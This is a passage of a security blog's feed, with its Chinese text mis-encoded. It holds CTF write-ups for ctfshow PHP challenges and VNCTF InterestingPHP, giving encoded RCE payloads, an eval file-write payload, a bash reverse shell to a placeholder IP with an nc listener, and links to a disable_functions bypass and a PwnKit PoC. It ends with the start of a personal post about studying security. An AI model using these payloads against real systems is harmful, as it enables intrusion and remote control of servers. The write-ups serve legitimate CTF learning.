class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸»è¦éš¾ç‚¹å˜ä¸ºä¸­é—´çš„è¿ç®—ç¬¦éš¾æ</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=1&amp;v2=2&amp;v3=|(~(%8c%86%8c%8b%9a%92))(~(%9c%9e%8b%df%99%93%9e%98%d1%8f%97%8f))|</span><br></pre></td></tr></table></figure><h2 id="web147"><a href="#web147" class="headerlink" title="web147"></a>web147</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;ctf&#x27;]))&#123;</span><br><span class="line">    $ctfshow = $_POST[&#x27;ctf&#x27;];</span><br><span class="line">    if(!preg_match(&#x27;/^[a-z0-9_]*$/isD&#x27;,$ctfshow)) &#123;</span><br><span class="line">        $ctfshow(&#x27;&#x27;,$_GET[&#x27;show&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>phpé‡Œé»˜è®¤å‘½åç©ºé—´æ˜¯\ï¼Œæ‰€æœ‰åŸç”Ÿå‡½æ•°å’Œç±»éƒ½åœ¨è¿™ä¸ªå‘½åç©ºé—´ä¸­ã€‚ æ™®é€šè°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œå¦‚æœç›´æ¥å†™å‡½æ•°åfunction_name()è°ƒç”¨ï¼Œè°ƒç”¨çš„æ—¶å€™å…¶å®ç›¸å½“äºå†™äº†ä¸€ä¸ªç›¸å¯¹è·¯ å¾„ï¼› è€Œå¦‚æœå†™\function_name()è¿™æ ·è°ƒç”¨å‡½æ•°ï¼Œåˆ™å…¶å®æ˜¯å†™äº†ä¸€ä¸ªç»å¯¹è·¯å¾„ã€‚ å¦‚æœä½ åœ¨å…¶ä»–namespaceé‡Œè°ƒç”¨ç³»ç»Ÿç±»ï¼Œå°±å¿…é¡»å†™ç»å¯¹è·¯å¾„è¿™ç§å†™æ³•</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?show=;&#125;;system(&#x27;grep flag flag.php&#x27;);/*</span><br><span class="line">[post data]</span><br><span class="line">ctf=%5ccreate_function</span><br></pre></td></tr></table></figure><h2 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line">if(isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">    $code=$_GET[&#x27;code&#x27;];</span><br><span class="line">    if(preg_match(&quot;/[A-Za-z0-9_\%\\|\~\&#x27;\,\.\:\@\&amp;\*\+\- ]+/&quot;,$code))&#123;</span><br><span class="line">        die(&quot;error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function get_ctfshow_fl0g()&#123;</span><br><span class="line">    echo file_get_contents(&quot;flag.php&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯èƒ½é¢˜ç›®æœ¬æ„ä¸æ˜¯è¿™æ ·ä½†æˆ‘ç›´æ¥æ— å­—æ¯rceäº†</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%03%01%0b%01%06%0c%01%07%01%0f%08%0f&quot;^&quot;%60%60%7f%21%60%60%60%60%2f%7f%60%7f&quot;);</span><br></pre></td></tr></table></figure><h2 id="web149"><a href="#web149" class="headerlink" title="web149"></a>web149</h2><blockquote><p>ä½ å†™çš„å¿«è¿˜æ˜¯æˆ‘åˆ çš„å¿«ï¼Ÿ</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$files = scandir(&#x27;./&#x27;); </span><br><span class="line">foreach($files as $file) &#123;</span><br><span class="line">    if(is_file($file))&#123;</span><br><span class="line">        if ($file !== &quot;index.php&quot;) &#123;</span><br><span class="line">            unlink($file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">file_put_contents($_GET[&#x27;ctf&#x27;], $_POST[&#x27;show&#x27;]);</span><br><span class="line"></span><br><span class="line">$files = scandir(&#x27;./&#x27;); </span><br><span class="line">foreach($files as $file) &#123;</span><br><span class="line">    if(is_file($file))&#123;</span><br><span class="line">        if ($file !== &quot;index.php&quot;) &#123;</span><br><span class="line">            unlink($file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸ªå¤§é—®é¢˜ï¼Œå¯ä»¥å¯¹index.phpè¿›è¡Œå†™çš„æ“ä½œï¼Œç›´æ¥å°†å…¶ç”¨ä¸€å¥è¯æœ¨é©¬è¦†ç›–æ‰</p><p>æ²¡ä»€ä¹ˆå¥½è¯´çš„æ¯”è¾ƒç®€å•ã€‚</p><h2 id="web150-æ—¥å¿—æ³¨å…¥"><a href="#web150-æ—¥å¿—æ³¨å…¥" class="headerlink" title="web150(æ—¥å¿—æ³¨å…¥)"></a>web150(æ—¥å¿—æ³¨å…¥)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class CTFSHOW&#123;</span><br><span class="line">    private $username;</span><br><span class="line">    private $password;</span><br><span class="line">    private $vip;</span><br><span class="line">    private $secret;</span><br><span class="line"></span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;vip = 0;</span><br><span class="line">        $this-&gt;secret = $flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isVIP()&#123;</span><br><span class="line">        return $this-&gt;vip?TRUE:FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __autoload($class)&#123;</span><br><span class="line">        if(isset($class))&#123;</span><br><span class="line">            $class();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#è¿‡æ»¤å­—ç¬¦</span><br><span class="line">$key = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class="line">if(preg_match(&#x27;/\_| |\[|\]|\?/&#x27;, $key))&#123;</span><br><span class="line">    die(&quot;error&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$ctf = $_POST[&#x27;ctf&#x27;];</span><br><span class="line">extract($_GET);</span><br><span class="line">if(class_exists($__CTFSHOW__))&#123;</span><br><span class="line">    echo &quot;class is exists!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE)&#123;</span><br><span class="line">    include($ctf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºctfå¯ä»¥ä»»æ„åŒ…å«ï¼Œå¯ä»¥ä½¿ç”¨æ—¥å¿—æ³¨å…¥ï¼Œç›´æ¥å¼€æã€‚</p><p><img src="https://img-blog.csdnimg.cn/09c65a648bf24834acc42b5808d1506b.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><h2 id="web150-plus"><a href="#web150-plus" class="headerlink" title="web150_plus"></a>web150_plus</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class CTFSHOW&#123;</span><br><span class="line">    private $username;</span><br><span class="line">    private $password;</span><br><span class="line">    private $vip;</span><br><span class="line">    private $secret;</span><br><span class="line"></span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;vip = 0;</span><br><span class="line">        $this-&gt;secret = $flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isVIP()&#123;</span><br><span class="line">        return $this-&gt;vip?TRUE:FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __autoload($class)&#123;</span><br><span class="line">        if(isset($class))&#123;</span><br><span class="line">            $class();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#è¿‡æ»¤å­—ç¬¦</span><br><span class="line">$key = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class="line">if(preg_match(&#x27;/\_| |\[|\]|\?/&#x27;, $key))&#123;</span><br><span class="line">    die(&quot;error&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$ctf = $_POST[&#x27;ctf&#x27;];</span><br><span class="line">extract($_GET);</span><br><span class="line">if(class_exists($__CTFSHOW__))&#123;</span><br><span class="line">    echo &quot;class is exists!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE &amp;&amp; strrpos($ctf,&quot;log&quot;)===FALSE)&#123;</span><br><span class="line">    include($ctf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">è¿™ä¸ªé¢˜ä¸€ç‚¹ç‚¹å°å‘__autoload()å‡½æ•°ä¸æ˜¯ç±»é‡Œé¢çš„</span><br><span class="line">__autoload â€” å°è¯•åŠ è½½æœªå®šä¹‰çš„ç±»</span><br><span class="line">æœ€åæ„é€ ?..CTFSHOW..=phpinfoå°±å¯ä»¥çœ‹åˆ°phpinfoä¿¡æ¯å•¦</span><br><span class="line">åŸå› æ˜¯..CTFSHOW..è§£æå˜é‡æˆ__CTFSHOW__ç„¶åè¿›è¡Œäº†å˜é‡è¦†ç›–ï¼Œå› ä¸ºCTFSHOWæ˜¯ç±»å°±ä¼šä½¿ç”¨</span><br><span class="line">__autoload()å‡½æ•°æ–¹æ³•ï¼Œå»åŠ è½½ï¼Œå› ä¸ºç­‰äºphpinfoå°±ä¼šå»åŠ è½½phpinfo</span><br><span class="line">æ¥ä¸‹æ¥å°±å»getshellå•¦</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..CTFSHOW..=phpinfo</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ctfshow-phpçš„ç‰¹æ€§&quot;&gt;&lt;a href=&quot;#ctfshow-phpçš„ç‰¹æ€§&quot; class=&quot;headerlink&quot; title=&quot;ctfshow phpçš„ç‰¹æ€§&quot;&gt;&lt;/a&gt;ctfshow phpçš„ç‰¹æ€§&lt;/h1&gt;&lt;h2 id=&quot;web89&quot;&gt;&lt;a href=&quot;#</summary>
      
    
    
    
    <category term="wp" scheme="http://websec.space/categories/wp/"/>
    
    
    <category term="wp" scheme="http://websec.space/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>VNCTF InterestingPHP</title>
    <link href="http://websec.space/2022/02/14/[VNCTF%20InterestingPHP]/"/>
    <id>http://websec.space/2022/02/14/[VNCTF%20InterestingPHP]/</id>
    <published>2022-02-13T16:00:00.000Z</published>
    <updated>2022-02-13T16:08:21.092Z</updated>
    
    <content type="html"><![CDATA[<h1 id="VNCTF-InterestingPHP"><a href="#VNCTF-InterestingPHP" class="headerlink" title="[VNCTF InterestingPHP]"></a>[VNCTF InterestingPHP]</h1><p>æœ€è¿‘åšPHPé¢˜ç›®æ¯”è¾ƒå¤šï¼Œæ¯”èµ›å½“å¤©è¿™é¢˜æ€è€ƒæ¯”è¾ƒå¤šï¼Œä½†è¿˜æ˜¯æ²¡å‡ºï¼Œä»Šå¤©çœ‹äº†å®˜æ–¹wpè®°å½•ä¸€ä¸‹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php highlight_file(__FILE__); @eval($_GET[&#x27;exp&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><p>ä»£ç è¶Šç®€å•ï¼Œèº²åœ¨æš—å¤„çš„ç¦ç”¨è¶Šå¤šï¼Œæœç„¶systemè¢«banäº†ï¼Œphpinfo()éƒ½è¢«banäº†</p><p>å…ˆæŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(pos(localeconv())));</span><br><span class="line">Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; 1.php [3] =&gt; index.php [4] =&gt; secret.rdb )</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°åç›´æ¥highlight_fileåˆæ²¡æœ‰è¢«ban</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(&#x27;secret.rdb&#x27;);</span><br><span class="line">REDIS0008ï¿½    redis-ver4.0.9ï¿½</span><br><span class="line">redis-bitsï¿½@ï¿½ctimeÂ³ï¿½ï¿½aï¿½used-memÂ€ï¿½ï¿½aof-preambleï¿½ï¿½ï¿½sercetye_w4nt_a_gir1fri3ndï¿½ï¿½nRï¿½Kï¿½ï¿½S</span><br></pre></td></tr></table></figure><p>å¼€å¯äº†redisï¼Œä¼°è®¡æ˜¯å¾—ç”¨redisæ‰“ã€‚</p><p>ä½†æ˜¯è¿˜ç”¨var_dump(scandir(â€˜/â€˜))ä¸ç»™çœ‹ï¼Œæˆ‘åˆæƒ³èƒ½ä¸èƒ½open_basedirï¼Œä½†ç”¨uafæ‰“ä¸é€šï¼Œç›´æ¥è¿”å›500ã€‚</p><p>å°±è¿™æ ·æµªè´¹ä¸€ç‚¹æ—¶é—´ï¼Œèµ°äº†ä¸€æ®µå¼¯è·¯ã€‚</p><p>çœ‹redisæ‰“ï¼Œå°±çœ‹å†…ç½‘å¼€æ”¾äº†ç”šä¹ˆç«¯å£ã€‚ä½†systemè¢«banï¼Œè®©æˆ‘åšé¢˜å¾ˆè¢«åŠ¨ã€‚è¿™ä¹Ÿå¯èƒ½æ˜¯æœ€åæ²¡å‡ºçš„ä¸»è¦åŸå› ã€‚ã€‚ã€‚</p><p>è¯•äº†å¥½å¤šæ–¹æ³•ï¼Œä¹Ÿè¿ä¸Šäº†èšå‰‘è¯•äº†ï¼Œåˆšæ‰çœ‹å®˜æ–¹çš„wpï¼Œå‘ç°banäº†èšå‰‘çš„å‡½æ•°ï¼Œæœç„¶ã€‚è¿™é‡Œç»™å‡ºå®˜æ–¹çš„payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/?exp=eval(file_put_contents(&quot;1.php&quot;,base64_decode($_POST[&#x27;a&#x27;])));</span><br><span class="line">POST:</span><br><span class="line">a=PD9waHAKaGlnaGxpZ2h0X2ZpbGUoX19GSUxFX18pOwojIFBvcnQgc2Nhbgpmb3IoJGk9MDskaTw2NTUzNTskaS</span><br><span class="line">srKSB7CiAgJHQ9c3RyZWFtX3NvY2tldF9zZXJ2ZXIoInRjcDovLzAuMC4wLjA6Ii4kaSwkZWUsJGVlMik7CiAgaW</span><br><span class="line">YoJGVlMiA9PT0gIkFkZHJlc3MgYWxyZWFkeSBpbiB1c2UiKSB7CiAgICB2YXJfZHVtcCgkaSk7CiAgfQp9Cg</span><br></pre></td></tr></table></figure><blockquote><p>è¿”å›</p><p>int(80) int(8888)</p></blockquote><p>å¿½ç„¶çœ‹åˆ°ç¾¤é‡Œæœ‰å¤§ä½¬å‘äº†è‡ªå·±çš„wpå•Š</p><p>æˆ‘è§‰å¾—å¾ˆæœ‰æ„æ€å°±å»å°è¯•ä¸€ä¸‹</p><blockquote><p>å°è¯• bypass çš„ expï¼š<a href="https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php%EF%BC%8C%E5%85%B6%E4%B8%AD">https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.phpï¼Œå…¶ä¸­</a> <code>fwrite</code> è¢«ç¦äº†ï¼Œæ”¹æˆ <code>fputs</code></p></blockquote><p>æˆ‘ä¹Ÿå°è¯•ç”¨è¿™ä¸ªexpæ‰“äº†ä¸€ä¸‹</p><p>æœç„¶å¯ä»¥ï¼Œå¦‚ä½•å°è¯•getshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[c ç«¯]</span><br><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/7777 0&gt;&amp;1&quot;</span><br><span class="line">[s ç«¯]</span><br><span class="line">nc -l 7777</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/28250c9bfcbc4016a93dd67b2b251de1.png" alt="img"></p><p>æˆåŠŸgetshellæ³ªç›®äº†ï¼Œå‘œå‘œå‘œï¼Œå°±æ˜¯æ²¡æœ‰è®¿é—®çš„æƒé™æ‰€ä»¥å‡†å¤‡ææƒã€‚</p><p><a href="https://github.com/arthepsy/CVE-2021-4034">arthepsy/CVE-2021-4034: PoC for PwnKit: Local Privilege Escalation Vulnerability in polkitâ€™s pkexec (CVE-2021-4034) (github.com)</a></p><p><img src="https://img-blog.csdnimg.cn/04515c6fe5d3468d975f755bd171b2d3.png" alt="img"></p><p>é¡ºç€å¤§ä½¬çš„æ€è·¯æ‘¸è¿‡æ¥çš„ï¼Œtqlï¼Œå¼€é˜”äº†ç©webçš„æ€è·¯ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;VNCTF-InterestingPHP&quot;&gt;&lt;a href=&quot;#VNCTF-InterestingPHP&quot; class=&quot;headerlink&quot; title=&quot;[VNCTF InterestingPHP]&quot;&gt;&lt;/a&gt;[VNCTF InterestingPHP]&lt;/</summary>
      
    
    
    
    <category term="wp" scheme="http://websec.space/categories/wp/"/>
    
    
    <category term="wp" scheme="http://websec.space/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>å’³ï¼Œå¯’å‡</title>
    <link href="http://websec.space/2022/02/10/%E5%92%B3%EF%BC%8C%E5%AF%92%E5%81%87/"/>
    <id>http://websec.space/2022/02/10/%E5%92%B3%EF%BC%8C%E5%AF%92%E5%81%87/</id>
    <published>2022-02-09T16:00:00.000Z</published>
    <updated>2022-02-09T19:13:59.376Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å’³ï¼Œå¯’å‡"><a href="#å’³ï¼Œå¯’å‡" class="headerlink" title="å’³ï¼Œå¯’å‡"></a>å’³ï¼Œå¯’å‡</h1><p>â€‹        ä¸çŸ¥ä¸è§‰ï¼Œè¿™ä¸ªå¯’å‡åˆè¦è¿‡å»äº†ï¼Œå¤§å­¦çš„ç¬¬äºŒä¸ªå¯’å‡ï¼ŒåŠå¤œç¡ä¸ç€è§‰ï¼Œç´¢æ€§çˆ¬èµ·æ¥ï¼Œæ”¾ä¸€é¦–è½»éŸ³ä¹è®°å½•ä¸€ä¸‹å½“ä¸‹çš„æ„Ÿå—ã€‚ä½œä½œçš„æ–‡è‰ºä¸€æŠŠã€‚è¿™ä¸ªå¯’å‡è›®å¿™ç¢Œçš„å‡ ä¹æ²¡æœ‰ä¼‘æ¯ä¸€å¤©ï¼Œä¸æ•¢åœä¸‹ï¼Œå¥½å§æˆ‘å¿…é¡»æ‰¿è®¤ï¼Œæˆ‘æœ‰ç‚¹ç—´è¿·ï¼Œç”šè‡³äºé­”æ€”ã€‚çƒ­çˆ±å®‰å…¨çš„è¡Œä¸šï¼Œå–œæ¬¢å„ç§å¥‡å¥‡æ€ªæ€ªå°ä¼—çš„æŠ€å·§ï¼Œç”šè‡³äºçœ‹ä¸€ç¯‡åšå®¢ï¼Œç”šè‡³å‘ç°ä¸€äº›å¥‡æ€ªçš„æ¼æ´ï¼Œå½»åº•çš„å…´å¥‹ã€‚</p><p>â€‹        ç”šè‡³äºæœ‰äº›å¥‡æ€ªäº†ï¼Œæœ‹å‹å‘å°çº¦æˆ‘å‡ºé—¨çš„é‚€çº¦å¤§å¤šæ•°ä¹Ÿéƒ½æ‹’ç»äº†ï¼Œçˆ¶æ¯å¯èƒ½ä¹Ÿä¸æ‡‚è‡ªå·±å„¿å­ï¼Œå¤©å¤©å¯¹ç€ç”µè„‘ä¸Šä¸€ä¸²ä»£ç çœ‹çš„ä»€ä¹ˆåŠ²ï¼Œæ¯å¤©æ—©ä¸Šä¸€é†’çˆ¬èµ·æ¥å°±çœ‹ï¼Œä½†å´ä¹Ÿååˆ†å°Šé‡æˆ‘çš„çˆ±å¥½ï¼Œå°½å¯èƒ½çš„ä¸å½±å“ï¼Œç»™æˆ‘åˆ›é€ ä¸€ä¸ªåœ¨è¿™ä¸ªç¯å¢ƒçš„æœºä¼šã€‚å¯èƒ½ä¹ŸçŸ¥é“æˆ‘ä»å°åˆ°å¤§ï¼Œä¹Ÿæ²¡æœ‰å¯¹ä¸€ä¸ªäº‹ç‰©æœ‰å¦‚æ­¤çš„å…´è¶£ã€‚æƒ³æƒ³é«˜ä¸­çš„æ»‘æ¿è¿˜åœ¨å®¿èˆèººç€ï¼Œå°å­¦çš„å‰ä»–æ—©æ–­äº†é“‰ï¼Œå°‘æœ‰çš„åšæŒã€‚è®¤è¯†äº†ä¸€å¸®è·Ÿæˆ‘ä¸€æ ·çœŸçš„å–œæ¬¢å®‰å…¨çš„äººï¼Œpç¥å¯¹äºæŠ€æœ¯çš„æ€åº¦ï¼Œç¡®å®æœ‰ç‚¹å½±å“åˆ°æˆ‘ï¼Œç”šè‡³äºè§‰å¾—å¿—åŒé“åˆï¼Œï¼ˆå½“ç„¶æˆ‘æ˜¯èœé¸¡ï¼Œæèµ·è¿™äº›å¤§ä½¬å¤šå°‘æœ‰äº›å´‡æ‹œï¼‰ï¼Œäºæ˜¯èƒ½å¤Ÿçœ‹åˆ°ï¼Œå“ªæ€•å¤§å¹´ä¸‰åï¼Œå„ç§CTFè¿˜åœ¨å‡ºç€çº¢åŒ…é¢˜ï¼Œæˆç™¾äººåœ¨å‚ä¸ç€ã€‚å¯èƒ½å¤§å®¶å·²ç»æŠŠè¿™äº›ä¸œè¥¿å½“æˆæ¸¸æˆäº†ï¼Œï¼ˆé¢ï¼Œå¯èƒ½æ˜¯æˆ‘çš„æ„Ÿè§‰å§ï¼‰ã€‚</p><p>â€‹        ä½†é•¿æœŸçš„å­¦ä¹ ï¼Œä¸çŸ¥é“ä»å“ªå‡ºæ¥ä¸€è‚¡ä¸æœè¾“çš„åŠ²ï¼Œç”šè‡³äºæ…¢æ…¢çš„æ„ˆæ¼”æ„ˆçƒˆï¼ˆæ¯•ç«ŸçœŸæ­£å¼€å§‹æ·±å…¥å­¦ä¹ webå®‰å…¨çš„æ—¶é—´ä¹Ÿå°±æ˜¯åŠå¹´è¿‡ä¸€ç‚¹ï¼‰ã€‚åœ¨æœ‰äº›æ¯”èµ›æˆç»©ä¸å¦‚åˆ«äººæ—¶ï¼Œæˆ‘å¸¸å¸¸æƒ³ä¸ºä»€ä¹ˆä¸å¦‚åˆ«äººï¼Œè¿™ç§æƒ…ç»ªä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™æ…¢æ…¢å¼€å§‹ç§¯ç´¯çš„ã€‚ç”šè‡³äºä»Šå¤©æ™šä¸Šï¼Œæˆ‘å¥½åƒå¿˜è®°äº†æˆ‘å¼€å§‹å»æCTFï¼Œå»æå®‰å…¨å¼€å‘ï¼Œæˆ‘çš„åˆå¿ƒæ˜¯ä»€ä¹ˆï¼Œæˆ‘å¯¹äºæŠ€æœ¯çš„åˆå¿ƒæ˜¯ä»€ä¹ˆã€‚å¥½åƒè‡ªå·±çš„åŠªåŠ›éƒ½æ¸æ¸è¢«é‡åŒ–æˆäº†flagï¼Œæˆ‘æ‹¿åˆ°äº†å°±ç¬‘ï¼Œæ‹¿ä¸åˆ°å°±ä¸é«˜å…´ã€‚è¿™æ ·çš„å¿ƒæƒ…ç»™è‡ªå·±äº§ç”Ÿäº†æƒ…ç»ªï¼Œå°±æ˜¯æ¯å¤©è¿‡çš„å¥½ç´¯ï¼Œå¥½åƒå¿˜æ‰äº†å½“æ—¶å­¦åˆ°æ–°ä¸œè¥¿æ—¶çš„å…´å¥‹ï¼Œæ›´ç”šè‡³äºæƒ³æ”¾å¼ƒäº†ã€‚æƒ³æƒ³ä¹Ÿæœ‰ä¸€å®šé“ç†ï¼Œå½“æˆ‘å­¦ä¹ 